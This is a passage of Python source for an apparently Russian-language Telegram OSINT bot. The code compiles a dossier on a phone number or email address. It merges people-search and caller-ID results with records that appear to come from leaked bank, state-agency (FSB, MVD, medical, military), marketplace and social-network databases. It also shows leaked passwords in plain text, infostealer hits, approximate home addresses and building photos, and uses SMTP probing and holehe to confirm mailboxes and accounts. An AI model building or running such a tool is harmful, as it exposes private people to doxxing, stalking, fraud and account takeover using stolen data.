        identity_text += "━━━━━━━━━━━━━━━━━━\n👤 <b>ЛИЧНОСТЬ (TruePeopleSearch):</b>\n"
        identity_text += f"  <b>ФИО:</b> {apify_tps['name']}\n"
        if apify_tps.get("age"):
            identity_text += f"  <b>Возраст:</b> {apify_tps['age']}\n"
        for addr in apify_tps.get("addresses", [])[:2]:
            identity_text += f"  <b>Адрес:</b> {addr}\n"
        identity_text += "\n"
    elif truecaller_py and truecaller_py.get("name"):
        identity_text += "━━━━━━━━━━━━━━━━━━\n👤 <b>ЛИЧНОСТЬ (Truecaller):</b>\n"
        identity_text += f"  <b>Имя:</b> {truecaller_py['name']}\n"
        if truecaller_py.get("carrier"):
            identity_text += f"  <b>Оператор:</b> {truecaller_py['carrier']}\n"
        identity_text += "\n"
    elif getcontact_cli and getcontact_cli.get("displayName"):
        identity_text += "━━━━━━━━━━━━━━━━━━\n👤 <b>ЛИЧНОСТЬ (GetContact):</b>\n"
        identity_text += f"  <b>Имя:</b> {getcontact_cli['displayName']}\n"
        if getcontact_cli.get("tags"):
            identity_text += f"  <b>Теги:</b> {', '.join(getcontact_cli['tags'][:5])}\n"
        identity_text += "\n"

    text += identity_text
    text += (f"📞 <b>Информация о номере</b>\n━━━━━━━━━━━━━━━━━━\n"
             f"<b>Номер:</b> {formatted}\n"
             f"<b>Регион:</b> {region_name}\n"
             f"<b>Оператор:</b> {operator}\n"
             f"<b>Часовой пояс:</b> {tz}\n"
             f"<b>Тип:</b> {line_type}\n")

    if veriphone:
        if veriphone.get("phone_type"):
            text += f"<b>Тип (Veriphone):</b> {veriphone['phone_type']}\n"
        if veriphone.get("carrier"):
            text += f"<b>Оператор (Veriphone):</b> {veriphone['carrier']}\n"

    if htmlweb:
        text += "━━━━━━━━━━━━━━━━━━\n📡 <b>HTMLWEB:</b>\n"
        if htmlweb.get("telcod"): text += f"  <b>Тел. код:</b> +{htmlweb['telcod']}\n"
        if htmlweb.get("country"): text += f"  <b>Страна:</b> {htmlweb['country']}\n"
        if htmlweb.get("okrug"): text += f"  <b>Округ:</b> {htmlweb['okrug']}\n"
        if htmlweb.get("region"): text += f"  <b>Регион:</b> {htmlweb['region']}\n"
        if htmlweb.get("city"): text += f"  <b>Город:</b> {htmlweb['city']}\n"
        if htmlweb.get("latitude") and htmlweb.get("longitude"):
            text += f"  <b>Координаты:</b> {htmlweb['latitude']}, {htmlweb['longitude']}\n"
        if htmlweb.get("timezone"):
            text += f"  <b>Часовой пояс:</b> +{htmlweb['timezone']} UTC\n"
        if htmlweb.get("oper"):
            text += f"  <b>Оператор:</b> {htmlweb['oper']}\n"
        if htmlweb.get("latitude") and htmlweb.get("longitude"):
            try:
                addr, _ = get_address_by_coordinates(htmlweb["latitude"], htmlweb["longitude"])
                if addr:
                    translated = translate_address(addr)
                    addr_text = ", ".join(str(v) for v in translated.values())
                    text += f"  <b>Приблизительный адрес:</b> {addr_text}\n"
            except Exception:
                pass

    if numverify:
        text += "━━━━━━━━━━━━━━━━━━\n🌐 <b>Numverify:</b>\n"
        for k, v in numverify.items():
            if v:
                text += f"  <b>{k}:</b> {v}\n"
    if abstractapi:
        text += "━━━━━━━━━━━━━━━━━━\n🌐 <b>AbstractAPI:</b>\n"
        for k, v in abstractapi.items():
            if v:
                text += f"  <b>{k}:</b> {v}\n"
    if ipqs:
        text += "━━━━━━━━━━━━━━━━━━\n🛡️ <b>IPQualityScore:</b>\n"
        for k, v in ipqs.items():
            if v is not None:
                text += f"  <b>{k}:</b> {v}\n"
    if eyecon and (eyecon.get("name") or eyecon.get("photo")):
        text += "━━━━━━━━━━━━━━━━━━\n👁 <b>Eyecon:</b>\n"
        if eyecon.get("name"): text += f"  <b>Имя:</b> {eyecon['name']}\n"
        if eyecon.get("carrier"): text += f"  <b>Оператор:</b> {eyecon['carrier']}\n"
        if eyecon.get("photo"): text += f"  <b>Фото:</b> <a href='{eyecon['photo']}'>ссылка</a>\n"
    if syncme and syncme.get("name"):
        text += "━━━━━━━━━━━━━━━━━━\n🔗 <b>Sync.me:</b>\n"
        text += f"  <b>Имя:</b> {syncme['name']}\n"
        if syncme.get("carrier"): text += f"  <b>Оператор:</b> {syncme['carrier']}\n"
    if truecaller and truecaller.get("name"):
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Truecaller:</b>\n"
        text += f"  <b>Имя:</b> {truecaller['name']}\n"
        if truecaller.get("carrier"): text += f"  <b>Оператор:</b> {truecaller['carrier']}\n"
        if truecaller.get("spam"): text += f"  <b>Спам:</b> {truecaller['spam']}\n"
        if truecaller.get("tags"): text += f"  <b>Теги:</b> {truecaller['tags']}\n"
    if getcontact_live and getcontact_live.get("tags"):
        text += "━━━━━━━━━━━━━━━━━━\n📇 <b>Getcontact (live):</b>\n"
        for tag in getcontact_live["tags"][:10]:
            text += f"  • {tag}\n"
    if tg_phone:
        text += "━━━━━━━━━━━━━━━━━━\n✈️ <b>Telegram:</b>\n"
        if tg_phone.get("registered"):
            text += "  ✅ Зарегистрирован\n"
            if tg_phone.get("title"): text += f"  <b>Имя:</b> {tg_phone['title']}\n"
            if tg_phone.get("extra"): text += f"  <b>Доп:</b> {tg_phone['extra']}\n"
        else:
            text += "  ❌ Не зарегистрирован\n"
    if wa_phone:
        text += "━━━━━━━━━━━━━━━━━━\n💬 <b>WhatsApp:</b>\n"
        text += f"  {'✅ Зарегистрирован' if wa_phone.get('registered') else '❌ Не зарегистрирован'}\n"
    if viber_phone:
        text += "━━━━━━━━━━━━━━━━━━\n💜 <b>Viber:</b>\n"
        text += f"  {'✅ Зарегистрирован' if viber_phone.get('registered') else '❌ Не зарегистрирован'}\n"
    if mnp_info:
        text += "━━━━━━━━━━━━━━━━━━\n🔄 <b>MNP (перенос номера):</b>\n"
        for k, v in mnp_info.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if hlr_info:
        text += "━━━━━━━━━━━━━━━━━━\n📡 <b>HLR-lookup:</b>\n"
        for k, v in hlr_info.items():
            if v is not None: text += f"  <b>{k}:</b> {v}\n"
    if twilio:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Twilio Lookup:</b>\n"
        for k, v in twilio.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if vonage:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Vonage:</b>\n"
        for k, v in vonage.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if telesign:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Telesign:</b>\n"
        for k, v in telesign.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if numlookup:
        text += "━━━━━━━━━━━━━━━━━━\n🌐 <b>Numlookupapi (старый):</b>\n"
        for k, v in numlookup.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if numlookupapi_new:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>NumLookupAPI (новый):</b>\n"
        for k in ("valid", "carrier", "location", "line_type", "country_name"):
            if numlookupapi_new.get(k):
                text += f"  <b>{k}:</b> {numlookupapi_new[k]}\n"
    if melissa:
        text += "━━━━━━━━━━━━━━━━━━\n🌐 <b>Melissa:</b>\n"
        for k, v in melissa.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if whitepages:
        text += "━━━━━━━━━━━━━━━━━━\n📖 <b>Whitepages:</b>\n"
        for k, v in whitepages.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if zaba and (zaba.get("name") or zaba.get("carrier")):
        text += "━━━━━━━━━━━━━━━━━━\n🦓 <b>Zaba:</b>\n"
        for k, v in zaba.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if callapp and (callapp.get("name") or callapp.get("tags")):
        text += "━━━━━━━━━━━━━━━━━━\n📱 <b>Callapp:</b>\n"
        if callapp.get("name"): text += f"  <b>Имя:</b> {callapp['name']}\n"
        if callapp.get("tags"): text += f"  <b>Теги:</b> {callapp['tags']}\n"
        if callapp.get("spam"): text += f"  <b>Спам:</b> {callapp['spam']}\n"
    if hiya and (hiya.get("name") or hiya.get("spam")):
        text += "━━━━━━━━━━━━━━━━━━\n📱 <b>Hiya:</b>\n"
        for k, v in hiya.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if mrnumber and (mrnumber.get("name") or mrnumber.get("spam_score")):
        text += "━━━━━━━━━━━━━━━━━━\n📱 <b>Mr. Number:</b>\n"
        for k, v in mrnumber.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if shouldianswer and (shouldianswer.get("name") or shouldianswer.get("rating")):
        text += "━━━━━━━━━━━━━━━━━━\n📱 <b>Should I Answer:</b>\n"
        for k, v in shouldianswer.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if tellows and (tellows.get("name") or tellows.get("rating")):
        text += "━━━━━━━━━━━━━━━━━━\n📱 <b>Tellows:</b>\n"
        for k, v in tellows.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if ktozvonil and (ktozvonil.get("name") or ktozvonil.get("rating")):
        text += "━━━━━━━━━━━━━━━━━━\n📱 <b>Кто звонил:</b>\n"
        if ktozvonil.get("name"): text += f"  <b>Имя:</b> {ktozvonil['name']}\n"
        if ktozvonil.get("rating"): text += f"  <b>Рейтинг:</b> {ktozvonil['rating']}\n"
        for c in ktozvonil.get("comments", []): text += f"  • {c}\n"
    if zvonili and (zvonili.get("name") or zvonili.get("rating")):
        text += "━━━━━━━━━━━━━━━━━━\n📱 <b>Zvonili:</b>\n"
        for k, v in zvonili.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if getipintel:
        text += "━━━━━━━━━━━━━━━━━━\n🛡️ <b>GetIPIntel:</b>\n"
        for k, v in getipintel.items():
            if v is not None: text += f"  <b>{k}:</b> {v}\n"
    if thatsthem and thatsthem.get("name"):
        text += "━━━━━━━━━━━━━━━━━━\n🇺🇸 <b>That'sThem:</b>\n"
        text += f"  <b>Имя:</b> {thatsthem['name']}\n"
    if apify_tps:
        text += "━━━━━━━━━━━━━━━━━━\n🇺🇸 <b>TruePeopleSearch (Apify):</b>\n"
        if apify_tps.get("name"): text += f"  <b>Имя:</b> {apify_tps['name']}\n"
        if apify_tps.get("age"): text += f"  <b>Возраст:</b> {apify_tps['age']}\n"
        for addr in apify_tps.get("addresses", [])[:2]:
            text += f"  <b>Адрес:</b> {addr}\n"
        for ph in apify_tps.get("phones", [])[:3]:
            text += f"  <b>Телефон:</b> {ph}\n"
    if apify_enrich:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Phone Enrichment (Apify):</b>\n"
        for k, v in apify_enrich.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if neutralino:
        text += "━━━━━━━━━━━━━━━━━━\n🌐 <b>NeutrinoAPI:</b>\n"
        for k, v in neutralino.items():
            if v: text += f"  <b>{k}:</b> {v}\n"
    if telnyx:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Telnyx:</b>\n"
        for k, v in telnyx.items():
            if isinstance(v, (str, int, float)) and v:
                text += f"  <b>{k}:</b> {v}\n"
    if signalwire:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>SignalWire:</b>\n"
        for k, v in signalwire.items():
            if isinstance(v, (str, int, float)) and v:
                text += f"  <b>{k}:</b> {v}\n"
    if bandwidth:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Bandwidth:</b>\n"
        for k, v in bandwidth.items():
            if isinstance(v, (str, int, float)) and v:
                text += f"  <b>{k}:</b> {v}\n"
    if plivo:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Plivo:</b>\n"
        for k, v in plivo.items():
            if isinstance(v, (str, int, float)) and v:
                text += f"  <b>{k}:</b> {v}\n"
    if commio:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Commio:</b>\n"
        for k, v in commio.items():
            if isinstance(v, (str, int, float)) and v:
                text += f"  <b>{k}:</b> {v}\n"

    if hibp_detailed:
        text += "━━━━━━━━━━━━━━━━━━\n🔐 <b>HIBP — утечки:</b>\n"
        for b in hibp_detailed[:10]:
            text += (f"  • <b>{b['title']}</b>\n"
                     f"    📅 {b['breach_date']} | 👥 {b['pwn_count']:,}\n"
                     f"    📊 {', '.join(b['data_classes'][:5])}\n"
                     f"    🔗 <a href='{b['url']}'>страница утечки</a>\n")
        if len(hibp_detailed) > 10:
            text += f"  <i>... и ещё {len(hibp_detailed) - 10}</i>\n"

    if xon_detailed:
        text += "━━━━━━━━━━━━━━━━━━\n🔐 <b>XposedOrNot — утечки:</b>\n"
        for b in xon_detailed[:10]:
            text += f"  • {b['name']} — <a href='{b['url']}'>инфо</a>\n"
        if len(xon_detailed) > 10:
            text += f"  <i>... и ещё {len(xon_detailed) - 10}</i>\n"

    people_search_block = ""
    for name, data in [
        ("Spokeo", spokeo), ("Whitepages People", whitepages_people),
        ("BeenVerified", beenverified), ("Radaris", radaris),
        ("Intelius", intelius), ("TruthFinder", truthfinder),
        ("FastPeopleSearch", fastpeoplesearch), ("TruePeopleSearch", truepeoplesearch),
        ("PeopleFinders", peoplefinders), ("MyLife", mylife),
    ]:
        if data and data.get("found"):
            people_search_block += f"  • <b>{name}:</b> найден профиль\n"
    if people_search_block:
        text += "━━━━━━━━━━━━━━━━━━\n🔍 <b>People-search:</b>\n" + people_search_block

    breach_block = ""
    if hibp_phone and hibp_phone.get("breaches"):
        breach_block += f"  • <b>HIBP:</b> {len(hibp_phone['breaches'])} утечек\n"
    if dehashed and dehashed.get("entries"):
        breach_block += f"  • <b>DeHashed:</b> {len(dehashed['entries'])} записей\n"
    if intelx_phone and intelx_phone.get("records"):
        breach_block += f"  • <b>Intelligence X:</b> {len(intelx_phone['records'])} записей\n"
    if breach_block:
        text += "━━━━━━━━━━━━━━━━━━\n🔐 <b>Breach-check:</b>\n" + breach_block

    if ipqs_phone:
        text += "━━━━━━━━━━━━━━━━━━\n🛡️ <b>IPQS Phone:</b>\n"
        for k in ("valid", "active", "fraud_score", "recent_abuse", "voip",
                  "prepaid", "risky", "carrier", "line_type"):
            if ipqs_phone.get(k) is not None:
                text += f"  <b>{k}:</b> {ipqs_phone[k]}\n"

    if hlrlookup:
        text += "━━━━━━━━━━━━━━━━━━\n📡 <b>HLR Lookup:</b>\n"
        for k, v in hlrlookup.items():
            if v is not None:
                text += f"  <b>{k}:</b> {v}\n"

    if telesign_phoneid:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Telesign PhoneID:</b>\n"
        for k, v in telesign_phoneid.items():
            if isinstance(v, (str, int, float)):
                text += f"  <b>{k}:</b> {v}\n"

    if vonage_ni:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Vonage NI:</b>\n"
        for k, v in vonage_ni.items():
            if isinstance(v, (str, int, float)):
                text += f"  <b>{k}:</b> {v}\n"

    if twilio_lookup:
        text += "━━━━━━━━━━━━━━━━━━\n📞 <b>Twilio Lookup (v1):</b>\n"
        for k, v in twilio_lookup.items():
            if isinstance(v, (str, int, float)):
                text += f"  <b>{k}:</b> {v}\n"

    social_phone_block = ""
    if fb_phone.get("registered"):
        social_phone_block += "  • <b>Facebook:</b> ✅ зарегистрирован\n"
    if ig_phone.get("registered"):
        social_phone_block += "  • <b>Instagram:</b> ✅ зарегистрирован\n"
    if li_phone.get("registered"):
        social_phone_block += "  • <b>LinkedIn:</b> ✅ зарегистрирован\n"
    if snap_phone.get("registered"):
        social_phone_block += "  • <b>Snapchat:</b> ✅ зарегистрирован\n"
    if tt_phone.get("registered"):
        social_phone_block += "  • <b>TikTok:</b> ✅ зарегистрирован\n"
    if tw_phone.get("registered"):
        social_phone_block += "  • <b>Twitter/X:</b> ✅ зарегистрирован\n"
    if social_phone_block:
        text += "━━━━━━━━━━━━━━━━━━\n👥 <b>Соцсети (live):</b>\n" + social_phone_block

    bank_block = ""
    bank_block += _format_db_block("Сбербанк", "🏦", sberbank_data)
    bank_block += _format_db_block("Тинькофф", "🏦", tinkoff_data)
    bank_block += _format_db_block("ВТБ", "🏦", vtb_data)
    bank_block += _format_db_block("Альфа-Банк", "🏦", alfabank_data)
    if bank_block:
        text += "━━━━━━━━━━━━━━━━━━\n💳 <b>Банковские базы:</b>\n" + bank_block

    gov_block = ""
    gov_block += _format_db_block("ГИБДД", "🚗", gibdd_data)
    gov_block += _format_db_block("ФНС", "📊", fns_data)
    gov_block += _format_db_block("Пенсионный фонд", "👴", pension_data)
    gov_block += _format_db_block("МВД", "👮", mvd_data)
    gov_block += _format_db_block("ФССП", "⚖️", fssp_data)
    gov_block += _format_db_block("Росреестр", "🏠", rosreestr_data)
    gov_block += _format_db_block("Водительские права", "🪪", dl_data)
    gov_block += _format_db_block("Медицина", "🏥", medical_data)
    gov_block += _format_db_block("Образование", "🎓", education_data)
    gov_block += _format_db_block("Военкомат", "🎖️", military_data)
    if gov_block:
        text += "━━━━━━━━━━━━━━━━━━\n🏛️ <b>Государственные базы:</b>\n" + gov_block

    market_block = ""
    market_block += _format_db_block("Avito", "🛒", avito_data)
    market_block += _format_db_block("Wildberries", "🛍️", wildberries_data)
    market_block += _format_db_block("Ozon", "📦", ozon_data)
    market_block += _format_db_block("Яндекс.Еда", "🍔", yandex_eda_data)
    if market_block:
        text += "━━━━━━━━━━━━━━━━━━\n🛒 <b>Маркетплейсы:</b>\n" + market_block

    social_block = ""
    social_block += _format_db_block("ВКонтакте", "🔵", vk_data)
    social_block += _format_db_block("Одноклассники", "🟠", ok_data)
    social_block += _format_db_block("Mail.ru", "📧", mailru_data)
    social_block += _format_db_block("Яндекс", "🔴", yandex_data)
    social_block += _format_db_block("Gmail", "📧", gmail_data)
    if social_block:
        text += "━━━━━━━━━━━━━━━━━━\n👥 <b>Соцсети и почта:</b>\n" + social_block

    if generic_data:
        text += "━━━━━━━━━━━━━━━━━━\n📦 <b>Прочие базы:</b>\n"
        text += _format_db_block("Прочие базы", "📦", generic_data, limit=15)

    social_all = ""
    social_all += _format_db_block("TikTok", "🎵", tiktok_data)
    social_all += _format_db_block("Instagram", "📸", instagram_data)
    social_all += _format_db_block("Facebook", "📘", facebook_data)
    social_all += _format_db_block("Twitter/X", "🐦", twitter_data)
    social_all += _format_db_block("LinkedIn", "💼", linkedin_data)
    social_all += _format_db_block("Snapchat", "👻", snapchat_data)
    social_all += _format_db_block("Reddit", "👽", reddit_data)
    social_all += _format_db_block("Telegram (база)", "✈️", telegram_db_data)
    social_all += _format_db_block("WhatsApp (база)", "💬", whatsapp_db_data)
    social_all += _format_db_block("Viber (база)", "💜", viber_db_data)
    social_all += _format_db_block("Signal (база)", "🔐", signal_db_data)
    social_all += _format_db_block("Discord", "🎮", discord_db_data)
    social_all += _format_db_block("Steam", "🎮", steam_data)
    social_all += _format_db_block("Twitch", "📺", twitch_data)
    social_all += _format_db_block("Spotify", "🎧", spotify_data)
    social_all += _format_db_block("Netflix", "🎬", netflix_data)
    social_all += _format_db_block("Tinder", "🔥", tinder_data)
    social_all += _format_db_block("Badoo", "💘", badoo_data)
    social_all += _format_db_block("Pinterest", "📌", pinterest_data)
    social_all += _format_db_block("Tumblr", "📝", tumblr_data)
    social_all += _format_db_block("Yandex Music", "🎵", yandex_music_data)
    social_all += _format_db_block("VK Music", "🎶", vk_music_data)
    if social_all:
        text += "━━━━━━━━━━━━━━━━━━\n🌐 <b>Социальные сети и базы:</b>\n" + social_all

    if leaked_passwords:
        text += "━━━━━━━━━━━━━━━━━━\n🔑 <b>Утечки паролей:</b>\n"
        for pwd in leaked_passwords[:10]:
            safe = str(pwd).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            text += f"  • <code>{safe}</code>\n"
        if len(leaked_passwords) > 10:
            text += f"  <i>... и ещё {len(leaked_passwords) - 10}</i>\n"

    if ok_info:
        text += "━━━━━━━━━━━━━━━━━━\n👥 <b>Одноклассники — аккаунт найден:</b>\n"
        for k, v in ok_info.items():
            text += f"  <b>{k}:</b> {v}\n"

    if interbase_data:
        text += "━━━━━━━━━━━━━━━━━━\n🗄️ <b>База Interbase:</b>\n"
        for k, v in interbase_data.items():
            if v: text += f"  • <b>{k}:</b> {v}\n"

    if fsb_records:
        text += f"━━━━━━━━━━━━━━━━━━\n🚨 <b>База ФСБ ({len(fsb_records)}):</b>\n"
        for i, rec in enumerate(fsb_records[:5], 1):
            text += f"  <b>{i}.</b> <b>{rec['ФИО']}</b>\n     📅 {rec['Дата рождения']}\n"
            if rec.get("Адрес"): text += f"     🏠 {rec['Адрес']}\n"
            if rec.get("Орган выдачи"): text += f"     🏛 {rec['Орган выдачи']}\n"
            if rec.get("Прочее"): text += f"     📝 {rec['Прочее'][:200]}\n"
        if len(fsb_records) > 5:
            text += f"  <i>... и ещё {len(fsb_records) - 5}</i>\n"

    if fsb_num_labels:
        uniq = list(dict.fromkeys(fsb_num_labels))
        text += f"━━━━━━━━━━━━━━━━━━\n📇 <b>Метки «ФСБ» ({len(uniq)}):</b>\n"
        for lbl in uniq[:20]:
            safe = lbl.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            text += f"  • {safe}\n"
        if len(uniq) > 20:
            text += f"  <i>... и ещё {len(uniq) - 20}</i>\n"

    if getcontact_names:
        text += f"━━━━━━━━━━━━━━━━━━\n📇 <b>Getcontact ({len(getcontact_names)}):</b>\n"
        for name in getcontact_names[:15]:
            safe = name.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            text += f"  • {safe}\n"
        if len(getcontact_names) > 15:
            text += f"  <i>... и ещё {len(getcontact_names) - 15}</i>\n"

    if god_eye_records:
        text += f"━━━━━━━━━━━━━━━━━━\n👁 <b>God_eye ({len(god_eye_records)}):</b>\n"
        for rec in god_eye_records[:5]:
            text += (f"  • <b>ID:</b> <code>{rec['tg_id']}</code> "
                     f"@{rec['username'] or '—'} — {rec['first_name']} {rec['last_name']}\n")

    if tg_records:
        text += f"━━━━━━━━━━━━━━━━━━\n✈️ <b>Telegram база ({len(tg_records)}):</b>\n"
        for rec in tg_records[:10]:
            safe_name = rec["name"].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            text += (f"  • <b>ID:</b> <code>{rec['tg_id']}</code> "
                     f"@{rec['username'] or '—'} — {safe_name}\n")
        if len(tg_records) > 10:
            text += f"  <i>... и ещё {len(tg_records) - 10}</i>\n"

    if breach_list:
        text += f"🔐 <b>Утечки:</b> {len(breach_list)} записей\n"
    if hudson_count:
        text += f"🛡️ <b>Инфостилеры:</b> {hudson_count} записей\n"

    wa_link = f"https://wa.me/{e164.replace('+', '')}"
    tg_link = f"https://t.me/{e164.replace('+', '')}"
    text += (f"━━━━━━━━━━━━━━━━━━\n📱 <b>Мессенджеры:</b>\n"
             f"  <a href='{wa_link}'>WhatsApp</a> | <a href='{tg_link}'>Telegram</a>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
             f"🔎 <a href='https://www.google.com/search?q=%22{quote(e164)}%22'>Поиск в Google</a>")

    # Фото здания по координатам из htmlweb (если есть)
    if htmlweb and htmlweb.get("latitude") and htmlweb.get("longitude"):
        try:
            lat_b = htmlweb["latitude"]
            lon_b = htmlweb["longitude"]
            send_building_photo(message.chat.id, lat_b, lon_b,
                                caption=f"📸 Примерное фото для номера {formatted}")
        except Exception as e:
            log(f"[BuildingPhoto phone] error: {e}")

    report = {"type": "phone", "title": f"Отчёт по номеру {formatted}", "sections": [
        {"heading": "Основные данные", "items": [
            ("Номер", formatted), ("E.164", e164), ("Регион", region_name),
            ("Оператор", operator), ("Часовой пояс", tz), ("Тип линии", line_type),
        ]},
    ]}
    return text, report


# ================== EMAIL ==================
def check_email_breaches(email):
    try:
        from xposedornot import XposedOrNot
        xon = XposedOrNot()
        result = xon.check_email(email)
        if result.breaches and len(result.breaches) > 0:
            bs = sorted(result.breaches)
            bl = "\n".join(f"  • {b}" for b in bs)
            header = f"⚠️ <b>Найден в {len(bs)} утечках:</b>\n"
            full = header + bl
            if len(full) > 3800:
                bl = bl[:3500] + "\n  ... <i>(обрезано)</i>"
                full = header + bl
            return full, bs
        return "✅ Не найден в известных утечках", []
    except ImportError:
        return "⚠️ XposedOrNot не установлен", []
    except Exception as e:
        return f"Ошибка: {str(e)[:50]}", []


def check_email_accounts(email):
    try:
        result = subprocess.run(["holehe", email, "--only-used", "--no-color"],
                                capture_output=True, text=True, timeout=90)
        output = result.stdout.strip()
        if not output:
            return "✅ Аккаунты не найдены", []
        found = [line.strip().replace("✔", "").strip()
                 for line in output.split("\n") if "✔" in line]
        if found:
            services = "\n".join(f"  • {s}" for s in found)
            return f"📧 Зарегистрирован на {len(found)} сервисах:\n{services}", found
        return "✅ Аккаунты не найдены", []
    except FileNotFoundError:
        return "⚠️ Holehe не установлен", []
    except subprocess.TimeoutExpired:
        return "⚠️ Holehe не ответил за 90 секунд", []
    except Exception as e:
        return f"Ошибка: {str(e)[:50]}", []


DISPOSABLE_DOMAINS = {
    "mailinator.com", "tempmail.com", "guerrillamail.com", "10minutemail.com",
    "throwawaymail.com", "yopmail.com", "sharklasers.com", "trashmail.com",
    "getnada.com", "temp-mail.org", "fakeinbox.com", "maildrop.cc",
    "dispostable.com", "mintemail.com", "mytrashmail.com", "spam4.me",
}

ROLE_PREFIXES = {
    "admin", "info", "support", "sales", "contact", "help", "billing",
    "office", "mail", "postmaster", "webmaster", "noreply", "no-reply",
}


def check_email_disposable(email):
    domain = email.split("@")[-1].lower()
    if domain in DISPOSABLE_DOMAINS:
        return {"disposable": True, "domain": domain}
    try:
        r = requests.get(f"https://open.kickbox.com/v1/disposable/{domain}", timeout=8)
        if r.status_code == 200:
            data = r.json()
            return {"disposable": bool(data.get("disposable")), "domain": domain}
    except Exception:
        pass
    return {"disposable": False, "domain": domain}


def check_email_mx(email):
    domain = email.split("@")[-1].lower()
    try:
        answers = dns.resolver.resolve(domain, "MX", lifetime=8)
        mx_list = sorted([(str(r.exchange).rstrip("."), r.preference) for r in answers],
                         key=lambda x: x[1])
        return mx_list
    except Exception:
        return []


def check_email_smtp(email):
    domain = email.split("@")[-1].lower()
    try:
        mx_records = dns.resolver.resolve(domain, "MX", lifetime=8)
        mx_host = str(sorted(mx_records, key=lambda r: r.preference)[0].exchange).rstrip(".")
    except Exception:
        return {"status": "unknown", "reason": "MX не найден"}
    try:
        with socket.create_connection((mx_host, 25), timeout=8) as sock:
            sock.settimeout(8)
            f = sock.makefile("rb")
            f.readline()
            sock.sendall(b"EHLO check.local\r\n")
            while True:
                line = f.readline()
                if not line or line[3:4] != b"-":
                    break
            sock.sendall(b"MAIL FROM:<verify@check.local>\r\n")
            f.readline()
            sock.sendall(f"RCPT TO:<{email}>\r\n".encode())
            resp = f.readline().decode(errors="ignore")
            sock.sendall(b"QUIT\r\n")
        if resp.startswith("250"):
            return {"status": "valid", "reason": "Ящик существует"}
        if resp.startswith("550") or resp.startswith("551") or resp.startswith("553"):
            return {"status": "invalid", "reason": "Ящик не существует"}
        return {"status": "unknown", "reason": resp.strip()[:80]}
    except Exception as e:
        return {"status": "unknown", "reason": str(e)[:60]}


def check_email_gravatar(email):
    h = hashlib.md5(email.strip().lower().encode()).hexdigest()
    url = f"https://www.gravatar.com/avatar/{h}?d=404"
    try:
        r = requests.get(url, timeout=8, allow_redirects=False)
        if r.status_code == 200:
            return f"https://www.gravatar.com/avatar/{h}"
    except Exception:
        pass
    return None


def check_email_github(email):
    try:
        r = requests.get("https://api.github.com/search/users",
                         params={"q": f"{email} in:email", "per_page": 5},
                         headers={"Accept": "application/vnd.github+json"}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("total_count", 0) > 0:
                return [{"login": item["login"], "url": item["html_url"],
                         "avatar": item["avatar_url"]}
                        for item in data.get("items", [])[:5]]
    except Exception:
        pass
    return []


def check_email_pastes(email):
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/pasteaccount/{quote(email)}",
                         headers={"User-Agent": "OSINT-Bot/1.0"}, timeout=12)
        if r.status_code == 200:
            return r.json()
        if r.status_code == 404:
            return []
    except Exception:
        pass
    return []


def check_email_leakcheck(email):
    try:
        r = requests.get(f"https://leakcheck.net/api/public?check={quote(email)}", timeout=12)
        if r.status_code == 200:
            data = r.json()
            if data.get("success") and data.get("found", 0) > 0:
                return {"found": data.get("found", 0),
                        "sources": data.get("sources", [])[:20]}
    except Exception:
        pass
    return {}


def check_email_social(email):
    results = {}
    try:
        r = requests.get("https://api.github.com/search/users",
                         params={"q": f"{email} in:email"}, timeout=10)
        if r.status_code == 200 and r.json().get("total_count", 0) > 0:
            results["GitHub"] = [u["html_url"] for u in r.json().get("items", [])[:3]]
    except Exception:
        pass
    g = check_email_gravatar(email)
    if g:
        results["Gravatar"] = g
    return results


def check_email_domain_info(email):
    domain = email.split("@")[-1].lower()
    info = {"domain": domain}
    try:
        w = whois.whois(domain)
        if w.registrar:
            info["registrar"] = str(w.registrar)
        if w.creation_date:
            d = w.creation_date[0] if isinstance(w.creation_date, list) else w.creation_date
            info["created"] = str(d)
        if w.country:
            info["country"] = str(w.country)
    except Exception:
        pass
    try:
        a = dns.resolver.resolve(domain, "A", lifetime=5)
        info["ip"] = str(a[0])
    except Exception:
        pass
    return info


def check_email_role(email):
    local = email.split("@")[0].lower()
    if local in ROLE_PREFIXES:
        return True
    if re.match(r"^(info|support|admin|sales|contact|help|billing)\d*$", local):
        return True
    return False


def lookup_email(email_input):
    email = email_input.strip().lower()
    if "@" not in email or "." not in email.split("@")[-1]:
        return "❌ Некорректный email.", None

    breaches_text, breaches_list = check_email_breaches(email)
    accounts_text, accounts_list = check_email_accounts(email)
    disposable = check_email_disposable(email)
    mx_records = check_email_mx(email)
    smtp = check_email_smtp(email)
    gravatar = check_email_gravatar(email)
    github_users = check_email_github(email)
    leakcheck = check_email_leakcheck(email)
    domain_info = check_email_domain_info(email)
